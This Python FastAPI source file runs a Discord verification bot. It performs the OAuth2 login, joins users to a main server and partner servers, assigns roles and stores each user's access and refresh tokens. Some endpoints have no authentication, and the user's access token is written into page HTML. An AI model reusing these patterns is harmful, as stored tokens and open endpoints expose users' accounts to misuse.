ERROR_HTML = load_template("error.html")
GUIDE_HTML = load_template("guide.html")
HOME_HTML = load_template("home.html")


def render_error(error_title="", error_detail="", retry_url=""):
    return ERROR_HTML.replace("{error_title}", str(error_title)).replace("{error_detail}", str(error_detail)).replace("{retry_url}", str(retry_url))

def render_success(username=""):
    return SUCCESS_HTML.replace("{username}", str(username))


# Home page / portal landing index
@app.api_route("/", methods=["GET", "HEAD"], response_class=HTMLResponse)
async def home_page():
    # Generate the OAuth authorize URL dynamically
    params = {
        "client_id": CLIENT_ID or "",
        "redirect_uri": REDIRECT_URI or "",
        "response_type": "code",
        "scope": OAUTH_SCOPES
    }
    auth_url = f"https://discord.com/oauth2/authorize?{urllib.parse.urlencode(params)}"
    return HTMLResponse(content=HOME_HTML.replace("{{auth_url}}", auth_url))

# Guide Page
@app.api_route("/guide", methods=["GET", "HEAD"], response_class=HTMLResponse)
async def guide_page():
    return HTMLResponse(content=GUIDE_HTML)

# Unique Dynamic Verify Link for friends servers
@app.get("/verify/{guild_id}")
async def dynamic_verify_link(guild_id: str):
    params = {
        "client_id": CLIENT_ID or "",
        "redirect_uri": REDIRECT_URI or "",
        "response_type": "code",
        "scope": OAUTH_SCOPES,
        "state": str(guild_id)
    }
    auth_url = f"https://discord.com/oauth2/authorize?{urllib.parse.urlencode(params)}"
    return HTMLResponse(content=HOME_HTML.replace("{{auth_url}}", auth_url))

from pydantic import BaseModel
class SetupConfig(BaseModel):
    guild_id: str
    channel_id: str
    role_id: str
    embed_title: Optional[str] = None
    embed_desc: Optional[str] = None

async def verify_admin(token: str, target_guild_id: str) -> bool:
    # Just prefix with Bearer if not present
    if not token.startswith("Bearer "):
        token = "Bearer " + token
    async with httpx.AsyncClient() as client:
        res = await client.get("https://discord.com/api/users/@me/guilds", headers={"Authorization": token})
        if res.status_code != 200:
            return False
        guilds = res.json()
        for g in guilds:
            # Permissions can be string or int from discord api
            try:
                perms = int(g.get("permissions", 0))
                owner = g.get("owner", False)
                if str(g["id"]) == str(target_guild_id) and (owner or (perms & 0x8) == 0x8):
                    return True
            except Exception:
                pass
    return False

@app.get("/setup", response_class=HTMLResponse)
async def setup_page():
    params = {
        "client_id": CLIENT_ID or "",
        "redirect_uri": REDIRECT_URI or "",
        "response_type": "code",
        "scope": "identify guilds",
        "state": "web_setup"
    }
    auth_url = f"https://discord.com/oauth2/authorize?{urllib.parse.urlencode(params)}"
    return RedirectResponse(url=auth_url)

def log_debug(msg):
    try:
        with open("guild_debug.log", "a") as f:
            import datetime
            f.write(f"[{datetime.datetime.now()}] {msg}\n")
    except:
        pass

@app.get("/api/bot_details")
async def bot_details(request: Request):
    bot_info = {
        "status": "online" if bot.is_ready() else "offline",
        "bot_id": str(bot.user.id) if bot.user else None,
        "bot_name": str(bot.user) if bot.user else None,
        "guild_count": len(bot.guilds),
        "guilds": [{"id": str(g.id), "name": g.name} for g in bot.guilds],
        "client_id_env": CLIENT_ID
    }
    return bot_info
async def get_guild_details(guild_id: str, request: Request):
    auth_header = request.headers.get("Authorization")
    if not auth_header or not await verify_admin(auth_header, guild_id):
        raise HTTPException(status_code=403, detail="Unauthorized or not admin of guild.")
        
    log_debug(f"get_guild_details called for {guild_id}")
    guild = bot.get_guild(int(guild_id))
    log_debug(f"bot.get_guild({guild_id}) returned: {guild}")
    fetch_err = "Not in cache."
    if not guild:
        try:
            guild = await bot.fetch_guild(int(guild_id))
            log_debug(f"bot.fetch_guild({guild_id}) returned: {guild}")
        except Exception as e:
            log_debug(f"bot.fetch_guild({guild_id}) raised: {e}")
            fetch_err = str(e)
            guild = None
            
    if not guild:
        mismatch_warn = ""
        try:
            bot_id = str(bot.user.id) if bot.user else "Unknown"
            if str(CLIENT_ID).strip() != bot_id:
                mismatch_warn = f" MISMATCH! Bot Token ID: {bot_id}, but CLIENT_ID in .env is {CLIENT_ID}. You invited {CLIENT_ID} but the server runs as {bot_id}. Please fix your .env variables!"
        except:
            pass
            
        invite_url = f"https://discord.com/oauth2/authorize?client_id={bot.user.id if bot.user else CLIENT_ID}&permissions=8&integration_type=0&scope=bot%20applications.commands&guild_id={guild_id}&disable_guild_select=true"
        detail_msg = f"Discord says the bot is not in the server. If you see it in the server, it might be an 'App Integration' without a bot user, or Discord is lagging. Please kick the bot from the server manually, then click Invite Bot below again. (Debug: {fetch_err}){mismatch_warn}"
        return {"in_guild": False, "channels": [], "roles": [], "invite_url": invite_url, "detail": detail_msg}
        
    try:
        # Try to use cached channels, fallback to fetch
        channels_list = guild.text_channels
        if not channels_list:
            try:
                fetched_channels = await guild.fetch_channels()
                import discord
                channels_list = [c for c in fetched_channels if isinstance(c, discord.TextChannel)]
            except Exception:
                pass
                
        roles_list = guild.roles
        if not roles_list or len(roles_list) <= 1:
            try:
                roles_list = await guild.fetch_roles()
            except Exception:
                pass
                
        channels = [{"id": str(c.id), "name": c.name} for c in channels_list]
        roles = [{"id": str(r.id), "name": r.name} for r in roles_list]
        return {"in_guild": True, "channels": channels, "roles": roles}
    except Exception as e:
        import traceback
        traceback.print_exc()
        return {"in_guild": True, "channels": [], "roles": [], "detail": f"Partial error: {str(e)}"}

@app.post("/api/save_setup")
async def save_setup(data: SetupConfig, request: Request):
    auth_header = request.headers.get("Authorization")
    if not auth_header or not await verify_admin(auth_header, data.guild_id):
        raise HTTPException(status_code=403, detail="Unauthorized or not admin of guild.")
        
    # Save to DATABASE_URL2
    if DATABASE_URL2:
        try:
            conn = get_db2_conn()
            if not conn:
                raise HTTPException(status_code=500, detail="Database Connection Failure")
            cur = conn.cursor()
            query = """
                INSERT INTO friend_guild_configs (guild_id, role_id, embed_title, embed_desc)
                VALUES (?, ?, ?, ?)
                ON CONFLICT (guild_id) DO UPDATE SET 
                role_id = excluded.role_id,
                embed_title = excluded.embed_title,
                embed_desc = excluded.embed_desc;
            """
            cur.execute(query, (str(data.guild_id), str(data.role_id), data.embed_title, data.embed_desc))
            conn.commit()
            cur.close()
            conn.close()
        except Exception as e:
            logger.error(f"Error saving to DB2: {e}")
            raise HTTPException(status_code=500, detail="Database Error")
            
    # Dispatch embed
    try:
        await dispatch_premium_embed(int(data.channel_id))
        return {"success": True}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# OAuth2 Redirect / callback route
@app.get("/callback", response_class=HTMLResponse)
async def callback_handler(code: Optional[str] = None, state: Optional[str] = None):
    # Prepare authorization oauth retry reference link
    params = {
        "client_id": CLIENT_ID or "",
        "redirect_uri": REDIRECT_URI or "",
        "response_type": "code",
        "scope": OAUTH_SCOPES
    }
    retry_url = f"https://discord.com/oauth2/authorize?{urllib.parse.urlencode(params)}"

    if not code:
        return HTMLResponse(
            content=render_error(
                error_title="Authorization Cancelled",
                error_detail="We could not receive your verified identity tokens because you declined the authorisation popup request. Access permissions could not be validated.",
                retry_url=retry_url
            ),
            status_code=400
        )

    if not CLIENT_ID or not CLIENT_SECRET or not REDIRECT_URI:
        return HTMLResponse(
            content=render_error(
                error_title="OAuth System Misconfiguration",
                error_detail="Bot owner has not registered DISCORD_CLIENT_ID, DISCORD_CLIENT_SECRET, or DISCORD_REDIRECT_URI environment parameters on Render environment space.",
                retry_url=retry_url
            ),
            status_code=500
        )

    # Exchange Authorization Code for Token
    token_url = "https://discord.com/api/oauth2/token"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI
    }

    async with httpx.AsyncClient() as client:
        try:
            # 1. Post request key exchange
            token_response = await client.post(token_url, data=data, headers=headers)
            if token_response.status_code != 200:
                logger.error(f"Token exchange failed: {token_response.text}")
                return HTMLResponse(
                    content=render_error(
                        error_title="OAuth Token Exchange Error",
                        error_detail=f"Failed to fetch security credentials from Discord API services: {token_response.json().get('error_description', 'Invalid Code Parameter')}",
                        retry_url=retry_url
                    ),
                    status_code=400
                )
            
            token_data = token_response.json()
            access_token = token_data.get("access_token")
            refresh_token = token_data.get("refresh_token")
            
            if state == "web_setup":
                setup_html = load_template("setup.html")
                setup_html = setup_html.replace("{{access_token}}", access_token)
                setup_html = setup_html.replace("{{client_id}}", str(CLIENT_ID))
                bot_status = "Online" if bot.is_ready() else "Offline"
                if bot_status == "Online":
                    status_dot = '<span class="relative flex h-2.5 w-2.5"><span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span><span class="relative inline-flex rounded-full h-2.5 w-2.5 bg-emerald-500"></span></span>'
                else:
                    status_dot = '<span class="relative flex h-2.5 w-2.5"><span class="relative inline-flex rounded-full h-2.5 w-2.5 bg-rose-500"></span></span>'
                
                setup_html = setup_html.replace("{{bot_connection_status}}", f"{status_dot} {bot_status}")
                setup_html = setup_html.replace("{{bot_server_count}}", str(len(bot.guilds)))
                return HTMLResponse(setup_html)

            # 2. Get User Profile info database query matching
            user_response = await client.get(
                "https://discord.com/api/users/@me",
                headers={"Authorization": f"Bearer {access_token}"}
            )

            if user_response.status_code != 200:
                return HTMLResponse(
                    content=render_error(
                        error_title="Identity Extraction Refused",
                        error_detail="Discord successfully generated authorization credentials but restricted profile query reading permission limits.",
                        retry_url=retry_url
                    ),
                    status_code=400
                )

            user_data = user_response.json()
            discord_id = user_data.get("id")
            username = user_data.get("username")

            # Inline helper to verify, join, and assign roles for a given guild and role
            async def verify_user_in_guild(target_guild_id: str, target_role_id: str) -> tuple[bool, str, int]:
                if not bot.is_ready():
                    return False, "Gateway bot backend is starting up. Reload or retry in a few seconds.", 503
                
                guild = bot.get_guild(int(target_guild_id))
                if not guild:
                    try:
                        guild = await bot.fetch_guild(int(target_guild_id))
                    except Exception:
                        guild = None
                if not guild:
                    return False, "Target guild not found or bot is not in the server.", 404
                    
                member = guild.get_member(int(discord_id))
                if not member:
                    try:
                        member = await guild.fetch_member(int(discord_id))
                    except Exception:
                        try:
                            # User is not a member, try adding them automatically
                            add_member_url = f"https://discord.com/api/guilds/{target_guild_id}/members/{discord_id}"
                            add_headers = {"Authorization": f"Bot {DISCORD_TOKEN}", "Content-Type": "application/json"}
                            add_data = {"access_token": access_token}
                            add_resp = await safe_discord_request("PUT", add_member_url, json=add_data, headers=add_headers)
                            if add_resp and add_resp.status_code in [201, 204]:
                                await asyncio.sleep(1)
                                member = await guild.fetch_member(int(discord_id))
                            else:
                                status = add_resp.status_code if add_resp else "Connection Failed"
                                return False, f"Failed to join you to the server using OAuth (Status: {status}). Please join the server manually first.", 400
                        except Exception as e:
                            logger.error(f"Add user exception: {e}")
                            return False, f"Failed to join you to server automatically.", 400
                            
                if not member:
                    return False, "Member not found after attempt to add.", 400
                    
                role = guild.get_role(int(target_role_id))
                if not role:
                    return False, f"Verified role not found in server.", 404
                    
                try:
                    if role not in member.roles:
                        await member.add_roles(role)
                        logger.info(f"Verified & assigned role in {target_guild_id} to member: {username}")
                except discord.errors.Forbidden:
                    return False, "The bot doesn't have permissions to assign the verified role. Check the bot's role hierarchy.", 403
                except Exception as e:
                    return False, f"Failed to assign role: {e}", 500
                    
                return True, "Success", 200

            # 3. Dynamic server role assign action!
            if not GUILD_ID or not ROLE_ID:
                return HTMLResponse(
                    content=render_error("Deployment Targets Missing", "Target server (GUILD_ID) and reward category (VERIFIED_ROLE_ID) are missing.", retry_url),
                    status_code=500
                )

            # Always verify and add to main server
            main_success, main_err, main_code = await verify_user_in_guild(GUILD_ID, ROLE_ID)
            if not main_success:
                return HTMLResponse(content=render_error("Verification Failed (Main)", main_err, retry_url), status_code=main_code)

            # Optional: Add to friend's server if authorized from there
            if state and state != str(GUILD_ID):
                friend_role_id = get_friend_role(state)
                # If they set up a role in the partner server, attempt to join and role them there too.
                # Since the main condition is that they join the main server, if friend server drops, we still succeed or we can ignore friend server errors.
                if friend_role_id:
                    friend_success, friend_err, _ = await verify_user_in_guild(state, friend_role_id)
                    if not friend_success:
                        logger.warning(f"Could not verify in partner server {state}: {friend_err}")
                    else:
                        save_friend_verification(discord_id=discord_id, guild_id=state, username=username, access_token=access_token, refresh_token=refresh_token)

            # 4. Save information into database securely (Render PostgreSQL)
            save_verification(discord_id=discord_id, username=username, access_token=access_token, refresh_token=refresh_token)

            # 5. Send a DM message to the newly verified user!
            try:
                user_obj = await bot.fetch_user(int(discord_id))
                if user_obj:
                    target_guild_id = state if state else GUILD_ID
                    target_guild = bot.get_guild(int(target_guild_id))
                    
                    guild_name = target_guild.name if target_guild else "the server"
                    invite_link = None
                    if target_guild:
                        try:
                            # Try to find an existing channel we can invite to
                            text_channels = [c for c in target_guild.channels if isinstance(c, discord.TextChannel)]
                            if text_channels:
                                channel_to_invite = text_channels[0]
                                invites = await target_guild.invites()
                                if invites:
                                    invite_link = invites[0].url
                                else:
                                    invite = await channel_to_invite.create_invite(max_age=86400, max_uses=0, reason="Dynamic verification invite")
                                    invite_link = invite.url
                        except Exception as e:
                            logger.warning(f"Could not generate invite link for {target_guild_id}: {e}")
                    
                    desc = f"Congratulations **{username}**, your Discord account is securely verified.\n\nYou have been granted full server access."
                    
                    view = None
                    if invite_link:
                        button = discord.ui.Button(label=f"Return to {guild_name}", url=invite_link, style=discord.ButtonStyle.link, emoji="🔗")
                        view = discord.ui.View()
                        view.add_item(button)
                    else:
                        desc += "\n\nYou can now safely close your browser and return to Discord."
                        
                    em = discord.Embed(
                        title="✅ Verification Successful!",
                        description=desc,
                        color=discord.Color.brand_green()
                    )
                    
                    if view:
                        await user_obj.send(embed=em, view=view)
                    else:
                        await user_obj.send(embed=em)
            except Exception as e:
                logger.warning(f"Could not send DM to newly verified user {discord_id}: {e}")

            return HTMLResponse(
                content=render_success(username=username),
                status_code=200
            )

        except Exception as e:
            logger.exception("Inbound verification execution system error")
            return HTMLResponse(
                content=render_error(
                    error_title="Service Exception Error",
                    error_detail=f"An unhandled execution crash occurred during your transaction sequence: {str(e)}",
                    retry_url=retry_url
                ),
                status_code=500
            )


# -------------------------------------------------------------
# Trigger Panel Setup (Termux / API POST)
# -------------------------------------------------------------

@app.post("/api/send-embed")
async def send_verification_embed(channel_id: str):
    """ Allows triggering the setup via Termux/CURL (POST request) """
    if not bot.is_ready():
        raise HTTPException(status_code=503, detail="Gateway bot client connecting runtime standby...")
    
    try:
        await dispatch_premium_embed(int(channel_id))
        return {"success": True, "message": "Embed dispatch completed successfully via Termux/POST!"}
    
    except Exception as e:
        logger.exception("Embed dispatch crash event via POST")
        raise HTTPException(status_code=500, detail=f"Inbound processing failed: {str(e)}")

# Launch application
if __name__ == "__main__":
    port = int(os.getenv("PORT", 3000))
    uvicorn.run("main:app", host="0.0.0.0", port=port, reload=True)
